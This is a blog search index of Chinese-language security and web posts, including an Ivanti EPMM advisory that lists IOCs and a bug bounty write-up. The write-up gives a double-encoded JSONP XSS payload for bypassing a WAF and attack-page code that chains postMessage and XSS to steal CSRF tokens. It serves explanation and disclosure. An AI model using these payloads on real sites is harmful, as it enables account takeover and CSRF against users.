浏览器历史管理\rSPA通常需要手动处理历史记录：\n1 2 3 4 5 6 7 8 9 10 function changeView(itemId) { const contentView = document.getElementById(\u0026#39;contentView\u0026#39;); fetch(`/api/content/${itemId}`) .then(response =\u0026gt; response.json()) .then(content =\u0026gt; { contentView.innerHTML = content.html; // 必须手动更新历史记录 history.pushState({contentId: itemId}, null, `?content=${itemId}`); }); } 最佳实践方案\r1. ARIA角色与属性\r对自动更新内容使用aria-live=\u0026quot;polite\u0026quot; 为下拉菜单添加aria-expanded状态 使用aria-label提供元素描述 2. 键盘导航优化\r实现模态对话框的焦点陷阱 添加\u0026quot;跳过导航\u0026quot;链接 提供常用操作的键盘快捷键 3. 性能优化策略\r压缩JavaScript/CSS文件 使用WebP等现代图片格式 异步加载非关键脚本 4. 渐进增强原则\r确保核心功能不依赖JavaScript 禁用JS环境下测试关键流程 5. 持续无障碍测试\r集成WAVE、Lighthouse等自动化工具 组织真实辅助技术用户测试 定期使用NVDA/JAWS屏幕阅读器验证 通过实施这些技术方案，开发者可以构建既保持SPA动态特性又符合无障碍标准的现代Web应用。建议进一步参考WCAG标准和ARIA创作实践指南获取完整规范。\n","date":"2025-08-01T21:10:37+08:00","permalink":"http://localhost:1313/p/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8spa%E6%97%A0%E9%9A%9C%E7%A2%8D%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/","title":"单页应用(SPA)无障碍最佳实践指南"},{"content":"今天，微软宣布Azure Sphere全面上市（GA）。\nAzure Sphere的使命是赋能全球每个组织连接并创建安全可信的物联网设备。它是一个端到端的安全解决方案，既支持安全连接现有设备，也能为新型物联网设备提供内置安全保障。该解决方案涵盖硬件、操作系统和云服务，并通过持续的安全与系统更新确保设备在威胁演变中保持防护。\n创新要产生持久价值，必须建立在安全基础之上。安全研究人员通过协调漏洞披露（CVD）向微软提交漏洞报告，持续为保护数十亿用户发挥着关键作用。随着Azure Sphere的正式发布，我们邀请全球研究人员通过微软Azure赏金计划挖掘其高影响漏洞。符合条件的研究成果最高可获得4万美元奖励。\n若您对物联网安全研究感兴趣，请点击此处注册以获取项目信息。我们期待在未来数月分享更多计划进展！\n了解更多Azure Sphere信息，请访问正式发布公告博客及Azure Sphere官网。\n——Sylvie Liu，微软安全响应中心安全项目经理\n","date":"2025-08-01T21:04:07+08:00","permalink":"http://localhost:1313/p/%E6%AC%A2%E8%BF%8E%E5%8F%82%E4%B8%8Eazure-sphere%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%8E%B0%E5%B7%B2%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83/","title":"欢迎参与Azure Sphere安全研究——现已正式发布"},{"content":"摘要\r3月13日，Ivanti披露了影响其本地部署版Endpoint Manager Mobile产品的两个漏洞：CVE-2025-4427（认证绕过）和CVE-2025-4428（认证后RCE漏洞）。虽然单个漏洞严重性不高（CVSS评分分别为5.3和7.2），但组合利用后可使未认证攻击者在受影响EPMM实例上执行恶意代码。Ivanti确认在初始披露前已发现有限的实际攻击案例，GreyNoise和Wiz等多家机构证实自5月16日起出现大规模攻击活动，这与漏洞验证代码的公开时间基本吻合。\n受影响系统和/或应用\r以下版本的Ivanti Endpoint Manager Mobile：\n11.12.0.4及之前版本 12.3.0.1及之前版本 12.4.0.1及之前版本 12.5.0.0及之前版本 技术细节/攻击概述\rWiz对漏洞技术细节进行了精要总结：\n\u0026ldquo;CVE-2025-4428是EPMM设备功能使用报告查询验证器(DeviceFeatureUsageReportQueryRequestValidator)中的认证后远程代码执行漏洞。该漏洞源于Spring框架的AbstractMessageSource在处理错误消息时对用户输入的不安全处理，导致攻击者可通过EL表达式注入实现任意Java代码执行。精心构造/api/v2/featureusage端点中的format参数即可触发命令注入（如Runtime.exec()）。\nCVE-2025-4427是EPMM路由配置中的认证绕过漏洞。由于Spring Security配置缺少规则，导致/rs/api/v2/featureusage等路由意外暴露。这使得攻击者无需认证即可访问RCE触发点，在与CVE-2025-4428组合后实现完全的预认证RCE。但如watchTowr所指出的，这更准确地说是一个操作顺序缺陷，因为验证器逻辑在认证检查之前执行。\u0026rdquo;\nWiz还分享了从Sliver植入案例中提取的威胁指标：\nIOC 描述 1b1dda5e8e26da568559e0577769697c624df30e Sliver Beacon (SHA1) ac389c8b7f3d2fcf4fd73891f881b12b8343665b Sliver Beacon (SHA1) 79.96.45[.]181 Sliver C2 IP地址 该C2 IP目前仍处于活跃状态，根据共享证书判断，以下服务器可能也由同一攻击者控制：\n185.174.137[.]26 46.41.134[.]8 79.96.45[.]181 elektrobohater[.]pl wagodirect[.]pl e-wago[.]pl 缓解措施\r将EPMM实例升级至以下版本：\n11.12.0.5 12.3.0.2 12.4.0.2 12.5.0.1 在打补丁前，建议限制对受认证绕过影响的端点（/rs/api/v2/* 和 /mifs/rs/api/v2/*）的网络访问。\n网络融合中心采取的措施\rCFC将持续监控事态发展，必要时发布安全通告更新。除IOC检测外，正在研究更多威胁狩猎可能性。订阅漏洞扫描服务的客户将在扫描提供商发布相关插件后立即获得关键漏洞扫描结果。\nQualys ID：530061, 732523\nTenable ID：235860\n参考链接\rhttps://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM https://www.ivanti.com/blog/epmm-security-update https://www.greynoise.io/blog/ivanti-epmm-zero-days-reconnaissance-exploitation https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-exploited-in-the-wil-cve-2025-4427-cve-2025-4 https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/ ","date":"2025-08-01T20:57:30+08:00","permalink":"http://localhost:1313/p/ivanti-epmm%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E5%AE%9E%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB/","title":"Ivanti EPMM漏洞组合实现未授权远程代码执行攻击"},{"content":"TL;DR\r数月前在某公开漏洞赏金项目中，作者发现了一个精妙的漏洞链，包含：\n不安全的message事件监听 粗糙的JSONP端点 WAF绕过技巧 范围外子域的DOM型XSS 过度宽松的CORS配置 这些漏洞最终组合实现了对范围内资产的CSRF攻击。本文将深度剖析这个攻击链的技术细节。\n寻找棘手的CSRF漏洞\r目标赏金项目的范围仅限于www.redacted.com及其少数子域。当常规测试思路枯竭时，作者注意到inscope.redacted.com等子域会向https://www.redacted.com/api发送包含敏感操作（如更新用户资料）的POST请求。这些请求依赖标记为SameSite=None和Secure的sidcookie进行认证，但作为CSRF防护，端点要求查询参数中包含与会话绑定的csrftoken。\n宽松的CORS策略突破范围限制\r测试发现https://www.redacted.com/profile端点的CORS配置不仅允许https://in-scope.redacted.com，还接受任意redacted.com子域的请求：\n1 2 3 4 5 6 $ curl -sD - -o /dev/null \\ -H \u0026#34;Origin: https://whatever.redacted.com\u0026#34; \\ -H \u0026#34;Cookie: sid=xxx-yyy-zzz\u0026#34; \\ https://www.redacted.com/profile HTTP/1.1 200 OK Access-Control-Allow-Origin: https://whatever.redacted.com 范围外子域的不安全消息监听\r使用postMessage-tracker插件发现https://out-of-scope.redacted.com/search存在未做来源检查的message事件监听器，其处理逻辑会：\n解析事件数据为JSON对象 按点号分割method属性 递归访问window.APP对象的嵌套属性 调用最终获得的函数并传入arg参数 粗糙的JSONP端点导致DOM型XSS\rwindow.APP.apiCall函数用于向https://search.redacted.com的JSONP端点发送请求，但存在两个关键问题：\nURL构造不安全 回调参数验证存在缺陷 通过双重URL编码可绕过Akamai WAF防护：\n1 GET https://search.redacted.com/\u0026amp;callback=alert%2528%2527xss%2527%2529%252F%252F\u0026amp;output=jsonp HTTP/2 组合利用实现一键CSRF\r最终攻击流程：\n诱导用户点击恶意页面按钮 弹出窗口打开目标页面 通过postMessage触发JSONP请求 利用XSS窃取CSRF令牌 伪造用户资料更新请求 攻击页面核心代码：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; function sendMsg() { const doubleEncodedPayload = encode(encode(`${payload}//`)); const msg = { \u0026#39;method\u0026#39;: \u0026#39;APP.apiCall\u0026#39;, \u0026#39;arg\u0026#39;: `\u0026amp;callback=${doubleEncodedPayload}\u0026amp;output=jsonp#` }; win.postMessage(JSON.stringify(msg), url.origin); } \u0026lt;/script\u0026gt; 后续\r虽然漏洞链技术复杂度高（CVSS 7.1 High），但最终仅获得200欧元奖励。这反映出某些赏金项目对复杂攻击链的价值评估可能存在偏差。\n","date":"2025-08-01T20:51:05+08:00","permalink":"http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/","title":"漏洞链大杂烩：postMessage、JSONP、WAF绕过、DOM型XSS、CORS与CSRF的完美风暴"},{"content":"请勿在DNS MX记录中直接使用IP地址\r我想强调邮件服务器DNS记录中一个常见的错误配置。\n当域名配置接收邮件时，通常需要设置指向邮件服务器主机名的MX类型DNS记录。值得注意的是，根据RFC 1035规范，MX记录必须包含域名而不能直接指向IP地址。但某些邮件服务器仍会错误配置IP地址。多数邮件服务器对此类配置错误较为宽容仍能投递邮件，导致问题难以被发现。\n我使用的邮件服务器（Courier）对此限制较严格，因此时常因此无法发送邮件。虽然发生频率不高，但确实存在。若您的邮件服务器存在此类配置，可能会错过部分合法邮件。\n希望通过本文提高认知并推动修复。具体建议如下：\n邮件/DNS服务器管理员：请严格使用域名配置MX记录 IT服务提供商：应将此检查纳入定期审计清单（附Python检测脚本） 检测工具开发者：建议增加MX记录IP地址检测功能。目前仅Hardenize和IntoDNS等少数服务会警告此类问题。 我对Alexa Top 100万网站进行了快速扫描，约0.06%存在此问题（如果您认识相关责任人，请分享本文）。后续可能通过postmaster别名联系这些域名管理者。\n（图片来源：nohat.cc / CC0协议）\n技术讨论精选\r评论#1 - Erwin Hoffmann\r配置错误实际源于DNS负责人而非邮件服务器 仅IPv4地址可能被误用（语法与域名相似） DNS软件应增加输入验证机制 完整MX配置需包含： 域名 权重值 对应A/AAAA记录 现代互联网还需配置： 反向DNS SPF记录 TLSA记录 评论#2 - Spongebob\r使用IP地址将导致无法配置DKIM/DMARC（MX名称需匹配SSL证书）\n作者回复：此问题实际与MTA-STS相关（需验证主机名证书）\n","date":"2025-07-30T21:00:38+08:00","permalink":"http://localhost:1313/p/%E8%AF%B7%E5%8B%BF%E5%9C%A8dns-mx%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8ip%E5%9C%B0%E5%9D%80-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/","title":"请勿在DNS MX记录中直接使用IP地址 - 邮件服务器配置指南"},{"content":"Sinter：macOS全新用户态安全执行框架\r简单、开源且基于Swift\rSinter是我们用Swift编写的开源macOS端点安全执行代理（支持10.15及以上系统）。它完全基于用户态构建，利用新的EndpointSecurity API接收macOS内核发出的安全事件回调。通过简单规则即可控制事件允许/拒绝，无需传统杀毒软件的全盘扫描或特征检测。\n纯用户态安全代理的探索\r实现端点安全解决方案需要实时拦截和授权OS级事件。过去这意味着使用内核态回调API或直接挂钩内核代码。苹果在2019年末宣布将弃用所有第三方内核扩展，引入EndpointSecurity API作为替代方案。\nEndpointSecurity API解析\r该API实现了macOS内核的实时回调机制，支持NOTIFY（通知）和AUTH（授权）两种事件类型。它取代了原有的Kauth KPI等内核态方案，成为macOS 11 Big Sur后唯一合法的实时监控接口。\nSinter开发中的关键技术挑战\r实时决策不影响系统性能\n采用异步处理架构，通过es_copy_message解耦消息处理，建立双优先级队列（常规程序和大程序分离），确保系统响应能力。\n防范TOCTOU竞态条件\n针对\u0026quot;检查时-使用时\u0026quot;时间差攻击，实现文件事件监控机制。当检测到执行文件被篡改时立即清除缓存（已向苹果提交改进建议FB8352031）。\n应用包代码签名验证\nmacOS可执行文件存在于应用包（.app）中，需验证整个包的签名。Sinter创新性地实现双缓存机制：EndpointSecurity原生缓存+自定义应用包验证缓存。\n系统扩展安装优势\n作为System Extension部署可获得系统级保护（包括SIP扩展防护），防止root用户卸载。未来版本将迁移到此模式。\n证书签名与公证流程\n建立自动化CMake工作流处理苹果严格的代码签名、公证和权限申请（EndpointSecurity权限需6周人工审核）。\n未来展望\rSinter将持续增强规则引擎灵活性，整合文件完整性监控、内存注入防护（通过mmap事件分析）及NetworkExtension网络流量控制。我们欢迎社区通过GitHub或Empire Hacking Slack频道参与贡献。\n随着内核扩展的弃用，苹果为端点防护建立了统一用户态API标准，这将提升系统稳定性并减少攻击面，而Swift语言的选择确保了长期兼容性优势。\n","date":"0001-01-01T00:00:00Z","permalink":"http://localhost:1313/p/sintermacos%E5%85%A8%E6%96%B0%E7%94%A8%E6%88%B7%E6%80%81%E5%AE%89%E5%85%A8%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/","title":"Sinter：macOS全新用户态安全执行框架解析"}]